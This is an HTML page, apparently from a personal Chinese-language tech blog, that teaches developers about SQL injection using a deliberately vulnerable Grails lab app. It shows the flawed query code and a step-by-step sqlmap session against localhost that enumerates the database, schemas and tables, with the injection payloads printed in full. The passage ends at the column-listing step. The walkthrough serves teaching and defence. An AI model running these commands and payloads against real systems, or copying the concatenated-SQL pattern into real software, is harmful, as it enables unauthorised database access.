@@ -1,0 +1,759 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>PolloChang 工作筆記 - Sick Grails - SQL Injection </title>
+    
+    
+    <meta content="sqlmap, 資安, Sick Grails" name="keywords">
+    
+    <meta content="PolloChang 工作筆記 - 聲明: 進行滲透測試必須在合法的範圍內進行，並且要有網站擁有者的明確許可。如果你有這些權限，並且目的是進行安全測試。
+漏洞名稱 SQL Injection
+目標 透過實際程式範例讓程式開發人員理解 程式 與 SQL Injection 之間的關係
+環境 網站環境 grails version: 5.3.3 java version: java 17 範例程式: https://github.com/PolloChang/sick-grails.git 入侵環境 OS: Debian 12 tools: sqlmap 1.7.2 問題程式片段 sick-grails/grails-app/services/ex/Ex100Service.groovy 在程式中有透過字串組SQL方式進行查詢
+LinkedHashMap filter2(GrailsParameterMap params){ LinkedHashMap result = [:] List&lt;Ex100&gt; ex100L = Ex100.createCriteria().list() { if(params?.strings){ sqlRestriction(&#34; this_.strings = &#39;${params?.strings}&#39; &#34;) } } result.rows = ex100L.collect { it -&gt; [ id : it?.id, strings : it?.strings, integers : it?.integers, atms : it?" name="description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    
+        <link rel="icon" href="/images/logo.jpg">
+    
+
+    
+
+    
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-7QK0FBKQ5Q"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+          gtag('config', 'G-7QK0FBKQ5Q');
+        </script>
+    
+
+    
+
+    <link rel="stylesheet" href="/layui/css/layui.css">
+    <link rel="stylesheet" href="/self/css/default.css">
+    <script src=" /layui/layui.js"></script>
+
+    <link rel="stylesheet" async href="/self/css/markdown.min.css">
+    <link rel="stylesheet" async href="/self/css/gallery.css">
+    
+    
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous">
+    <script async src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js" integrity="sha256-PZEg+mIdptYTwWmLcBTsa99GIDZujyt7VHBZ9Lb2Jys=" crossorigin="anonymous"></script></head>
+
+<body>
+    
+    <header class="layui-header layui-bg-cyan">
+
+    
+        <a href=""><img src="/images/logo.jpg" class="layui-nav-img" style="margin-left:10px;margin-top:-10px"></a>
+    
+    
+    <a class="nav-self-logo" href="/">
+        PolloChang 工作筆記
+    </a>
+
+    <ul class="layui-nav layui-layout-right layui-bg-cyan" lay-filter="">
+        
+        
+        
+        
+
+        
+            
+                <li class="layui-nav-item" id="nav_big"><a href="/post/">文章</a></li>
+            
+                <li class="layui-nav-item" id="nav_big"><a href="/twgcb/">twgcb</a></li>
+            
+                <li class="layui-nav-item" id="nav_big"><a href="/worknot/">工作隨手記</a></li>
+            
+                <li class="layui-nav-item" id="nav_big"><a href="/personal-zone/">個人經歷</a></li>
+            
+                <li class="layui-nav-item" id="nav_big"><a href="/about/">關於</a></li>
+            
+        
+
+        
+        <li class="layui-nav-item" id="nav_small">
+            <a href="javascript:;">
+                <i class="layui-icon layui-icon-app" style="font-size: 24px;"></i>
+            </a>
+
+            <dl class="layui-nav-child">
+                
+                
+                
+
+                
+                    
+                        <dd><a href="/post/">文章</a></dd>
+                    
+                        <dd><a href="/twgcb/">twgcb</a></dd>
+                    
+                        <dd><a href="/worknot/">工作隨手記</a></dd>
+                    
+                        <dd><a href="/personal-zone/">個人經歷</a></dd>
+                    
+                        <dd><a href="/about/">關於</a></dd>
+                    
+                
+            </dl>
+        </li>
+    </ul>
+</header>
+
+<script>
+layui.use('element', function(){
+  var element = layui.element;
+});
+</script>
+
+        <div id="content" style="min-height:80%">
+<div class="layui-container" style="margin-bottom: 10px">
+    
+
+    <div class="layui-row layui-col-space10">
+        <div class="layui-col-md8 layui-col-sm12 layui-col-xs12">
+            <div class="layui-card single-card">
+                <br />
+                <blockquote class="self-elem-quote self-elem-quote-bg-cyan markdown-body single-title" >
+                    <h1>Sick Grails - SQL Injection</h1>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-08-18</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/sick-grails/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">Sick Grails</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/sqlmap/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">sqlmap</span>
+        </a>
+    
+        <a href="/tags/%e8%b3%87%e5%ae%89/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">資安</span>
+        </a>
+    
+    
+</h3>
+
+                </blockquote>
+                <div class="layui-card-body markdown-body single-content">
+                    <p><strong>聲明</strong>: 進行滲透測試必須在合法的範圍內進行，並且要有網站擁有者的明確許可。如果你有這些權限，並且目的是進行安全測試。</p>
+<h2 id="漏洞名稱">漏洞名稱</h2>
+<p>SQL Injection</p>
+<h2 id="目標">目標</h2>
+<p>透過實際程式範例讓程式開發人員理解 程式 與 SQL Injection 之間的關係</p>
+<h2 id="環境">環境</h2>
+<h3 id="網站環境">網站環境</h3>
+<ul>
+<li>grails version: 5.3.3</li>
+<li>java version: java 17</li>
+<li>範例程式: <a href="https://github.com/PolloChang/sick-grails.git">https://github.com/PolloChang/sick-grails.git</a></li>
+</ul>
+<h3 id="入侵環境">入侵環境</h3>
+<ul>
+<li>OS: Debian 12</li>
+<li>tools: sqlmap 1.7.2</li>
+</ul>
+<h2 id="問題程式片段">問題程式片段</h2>
+<ul>
+<li>sick-grails/grails-app/services/ex/Ex100Service.groovy</li>
+</ul>
+<p>在程式中有透過字串組SQL方式進行查詢</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>LinkedHashMap <span style="color:#a6e22e">filter2</span><span style="color:#f92672">(</span>GrailsParameterMap params<span style="color:#f92672">){</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    LinkedHashMap result <span style="color:#f92672">=</span> <span style="color:#f92672">[:]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    List<span style="color:#f92672">&lt;</span>Ex100<span style="color:#f92672">&gt;</span> ex100L <span style="color:#f92672">=</span> Ex100<span style="color:#f92672">.</span><span style="color:#a6e22e">createCriteria</span><span style="color:#f92672">().</span><span style="color:#a6e22e">list</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>params<span style="color:#f92672">?.</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">){</span>
+</span></span><span style="display:flex;"><span>            sqlRestriction<span style="color:#f92672">(</span><span style="color:#e6db74">&#34; this_.strings = &#39;${params?.strings}&#39; &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result<span style="color:#f92672">.</span><span style="color:#a6e22e">rows</span> <span style="color:#f92672">=</span> ex100L<span style="color:#f92672">.</span><span style="color:#a6e22e">collect</span> <span style="color:#f92672">{</span> it <span style="color:#f92672">-&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                id          <span style="color:#f92672">:</span> it<span style="color:#f92672">?.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                strings     <span style="color:#f92672">:</span> it<span style="color:#f92672">?.</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                integers    <span style="color:#f92672">:</span> it<span style="color:#f92672">?.</span><span style="color:#a6e22e">integers</span><span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                atms        <span style="color:#f92672">:</span> it<span style="color:#f92672">?.</span><span style="color:#a6e22e">atms</span><span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                status      <span style="color:#f92672">:</span> it<span style="color:#f92672">?.</span><span style="color:#a6e22e">status</span><span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="方式">方式</h2>
+<ol>
+<li>爬網站每個頁面並紀錄每個頁面可以傳遞的參數</li>
+<li>找出可以執行 SQL Injection 漏洞的參數，此範例的參數名稱是 <code>strings</code></li>
+<li>逐一取得有價值的資訊</li>
+</ol>
+<h3 id="詳細處理過程">詳細處理過程</h3>
+<h4 id="1-取得網站資料庫">1. 取得網站資料庫</h4>
+<h5 id="指令">指令</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --batch
+</span></span></code></pre></div><h5 id="結果">結果</h5>
+<p>可以得知此網站使用的資料庫是 PostgreSQL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --batch
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.7.2#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [&#39;]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [&#34;</span><span style="color:#f92672">]</span>_|_|_|__,|  _|
+</span></span><span style="display:flex;"><span>      |_|V...       |_|   https://sqlmap.org
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> legal disclaimer: Usage of sqlmap <span style="color:#66d9ef">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span style="color:#e6db74">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 00:19:04 /2024-08-18/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:19:04] [INFO] resuming back-end DBMS &#39;</span>postgresql<span style="color:#e6db74">&#39; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:19:04] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: strings (GET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;</span> AND 1463<span style="color:#f92672">=</span><span style="color:#ae81ff">1463</span> AND <span style="color:#e6db74">&#39;jWFI&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jWFI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: error-based
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;</span> AND 1706<span style="color:#f92672">=</span>CAST<span style="color:#f92672">((</span>CHR<span style="color:#f92672">(</span>113<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>98<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>120<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>118<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>113<span style="color:#f92672">))||(</span>SELECT <span style="color:#f92672">(</span>CASE WHEN <span style="color:#f92672">(</span>1706<span style="color:#f92672">=</span>1706<span style="color:#f92672">)</span> THEN <span style="color:#ae81ff">1</span> ELSE <span style="color:#ae81ff">0</span> END<span style="color:#f92672">))</span>::text<span style="color:#f92672">||(</span>CHR<span style="color:#f92672">(</span>113<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>120<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>98<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>118<span style="color:#f92672">)||</span>CHR<span style="color:#f92672">(</span>113<span style="color:#f92672">))</span> AS NUMERIC<span style="color:#f92672">)</span> AND <span style="color:#e6db74">&#39;mGGj&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mGGj
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: stacked queries
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;</span>;SELECT PG_SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>--
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: time-based blind
+</span></span><span style="display:flex;"><span>    Title: PostgreSQL &gt; 8.1 AND time-based blind
+</span></span><span style="display:flex;"><span>    Payload: strings<span style="color:#f92672">=</span>ZAP<span style="color:#e6db74">&#39; AND 3963=(SELECT 3963 FROM PG_SLEEP(5)) AND &#39;</span>nMkI<span style="color:#e6db74">&#39;=&#39;</span>nMkI
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:19:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is PostgreSQL
+</span></span><span style="display:flex;"><span>back-end DBMS: PostgreSQL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:19:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/pollochang/.local/share/sqlmap/output/localhost&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:19:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> your sqlmap version is outdated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 00:19:04 /2024-08-18/
+</span></span></code></pre></div><h4 id="2-取得-schema">2. 取得 schema</h4>
+<h5 id="指令-1">指令</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch --dbs
+</span></span></code></pre></div><h5 id="結果-1">結果</h5>
+<p>可以取得schema有 public, information_schema, pg_catalog</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch --dbs
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;]_____ ___ ___  {1.7.2#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [(]     | .&#39;</span>| . |
+</span></span><span style="display:flex;"><span>|___|_  <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 00:25:18 /2024-08-18/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:25:18<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
+</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: strings <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: strings<span style="color:#f92672">=</span>ZAP<span style="color:#e6db74">&#39; AND 1463=1463 AND &#39;</span>jWFI<span style="color:#e6db74">&#39;=&#39;</span>jWFI
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: error-based
+</span></span><span style="display:flex;"><span>    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: strings<span style="color:#f92672">=</span>ZAP<span style="color:#e6db74">&#39; AND 1706=CAST((CHR(113)||CHR(98)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1706=1706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND &#39;</span>mGGj<span style="color:#e6db74">&#39;=&#39;</span>mGGj
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: stacked queries
+</span></span><span style="display:flex;"><span>    Title: PostgreSQL &gt; 8.1 stacked queries <span style="color:#f92672">(</span>comment<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: strings<span style="color:#f92672">=</span>ZAP<span style="color:#e6db74">&#39;;SELECT PG_SLEEP(5)--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 AND time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;</span> AND 3963<span style="color:#f92672">=(</span>SELECT <span style="color:#ae81ff">3963</span> FROM PG_SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">))</span> AND <span style="color:#e6db74">&#39;nMkI&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nMkI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:18] [INFO] testing PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:18] [INFO] confirming PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:18] [INFO] the back-end DBMS is PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:18] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:18] [INFO] fetching database (schema) names
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">available databases [3]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] information_schema
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] pg_catalog
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] public
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:19] [WARNING] HTTP error codes detected during run:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">500 (Internal Server Error) - 2 times
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:25:19] [INFO] fetched data logged to text files under &#39;</span>/home/pollochang/.local/share/sqlmap/output/localhost<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:25:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> your sqlmap version is outdated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 00:25:19 /2024-08-18/
+</span></span></code></pre></div><h4 id="3-列出-table">3. 列出 table</h4>
+<h5 id="指令-2">指令</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public --tables
+</span></span></code></pre></div><h5 id="結果-2">結果</h5>
+<p>可以得知有以下資料表: ex100</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public --tables
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.7.2#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 00:26:15 /2024-08-18/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: strings (GET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1463=1463 AND &#39;jWFI&#39;=&#39;jWFI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: error-based
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1706=CAST((CHR(113)||CHR(98)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1706=1706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND &#39;mGGj&#39;=&#39;mGGj
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: stacked queries
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;;SELECT PG_SLEEP(5)--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 AND time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 3963=(SELECT 3963 FROM PG_SLEEP(5)) AND &#39;nMkI&#39;=&#39;nMkI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] testing PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] confirming PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] the back-end DBMS is PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] fetching tables for database: &#39;public&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] resumed: &#39;ex100&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Database: public
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[1 table]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+-------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ex100 |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+-------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [INFO] fetched data logged to text files under &#39;/home/pollochang/.local/share/sqlmap/output/localhost&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:26:15] [WARNING] your sqlmap version is outdated
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ending @ 00:26:15 /2024-08-18/
+</span></span></span></code></pre></div><h4 id="4-取得-table-欄位">4. 取得 table 欄位</h4>
+<h5 id="指令-3">指令</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public -T ex100 --columns
+</span></span></code></pre></div><h5 id="結果-3">結果</h5>
